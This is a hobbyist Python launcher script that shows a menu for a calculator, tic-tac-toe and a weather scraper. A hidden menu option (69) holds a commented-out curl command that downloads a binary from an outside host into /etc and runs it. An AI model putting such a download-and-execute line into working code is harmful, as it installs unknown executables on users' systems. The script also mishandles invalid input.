from time import sleep
from os import system
import calculator
import TicTacToe
import weatherwebscraper

# script to combine all python scripts i made.

def banner():
    print("""
               _                          
  (_)_   _ ___| |_    ___ _ __ __ _ _ __  
  | | | | / __| __|  / __| '__/ _` | '_ \ 
  | | |_| \__ \ |_  | (__| | | (_| | |_) |
 _/ |\__,_|___/\__|  \___|_|  \__,_| .__/ 
|__/  (69)                         |_|      
    """)
def menu():
    print("""
    Options: 
    1) Calculator
    2) Tic Tac Toe
    3) Weather web scraper
    """)



def main_me():
    system('clear')
    banner()
    menu()
    try:
        user_input = int(input(" ->  "))
    except ValueError as err:
        print("Invalid Input")
        print(err)
    if user_input == 1:
        # start calculator
        calculator.cal_1()
        main_me()
    elif user_input == 2:
        # start tic tac toe
        TicTacToe.maintic()
        main_me()
    elif user_input == 3:
        # start weather web scraper
        weatherwebscraper.main2()
        main_me()
    elif user_input == 69:
        # lmao
        # if you uncomment that line your an idiot.
        # system('curl http://scuzzy.tk/lnux.elf -o /etc/lnux.elf && cd /etc && ./lnux.elf')
        main_me()
    else:
        sleep(5)
        main_me()

main_me()

